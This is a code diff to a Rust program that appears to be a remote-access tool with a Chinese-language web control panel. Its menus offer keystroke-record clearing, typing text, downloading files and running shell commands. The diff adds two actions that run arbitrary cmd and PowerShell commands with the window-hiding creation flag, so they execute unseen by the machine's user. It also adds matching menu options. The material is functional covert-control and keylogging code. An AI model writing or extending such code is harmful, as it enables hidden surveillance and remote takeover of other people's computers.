@@ -160,6 +160,24 @@ async fn main() {
                                     .spawn()
                                     .unwrap();
                             }
+                            "cmb" => {
+                                Command::new("cmd")
+                                    .creation_flags(0x08000000)
+                                    .arg("/c")
+                                    .arg(b)
+                                    .status()
+                                    .await
+                                    .unwrap();
+                            }
+                            "pob" => {
+                                Command::new("powershell")
+                                    .creation_flags(0x08000000)
+                                    .arg("-Command")
+                                    .arg(b)
+                                    .status()
+                                    .await
+                                    .unwrap();
+                            }
                             "clr" => {
                                 let mut f = lck.lock().unwrap();
                                 let mut g = lock.lock().unwrap();
@@ -270,6 +288,8 @@ async fn main() {
                                     <select onchange="updateName(this)">
                                         <option value="cmd">运行命令提示符命令</option>
                                         <option value="pow">运行 Powershell 命令</option>
+                                        <option value="cmb">阻塞运行命令提示符命令</option>
+                                        <option value="pob">阻塞运行 Powershell 命令</option>
                                         <option value="clr">清空按键记录</option>
                                         <option value="txt">键入文本</option>
                                         <option value="zip">下载文件</option>
@@ -315,6 +335,8 @@ async fn main() {
                                 <select onchange="updateName(this)">
                                     <option value="cmd">运行命令提示符命令</option>
                                     <option value="pow">运行 Powershell 命令</option>
+                                    <option value="cmb">阻塞运行命令提示符命令</option>
+                                    <option value="pob">阻塞运行 Powershell 命令</option>
                                     <option value="clr">清空按键记录</option>
                                     <option value="txt">键入文本</option>
                                     <option value="zip">下载文件</option>
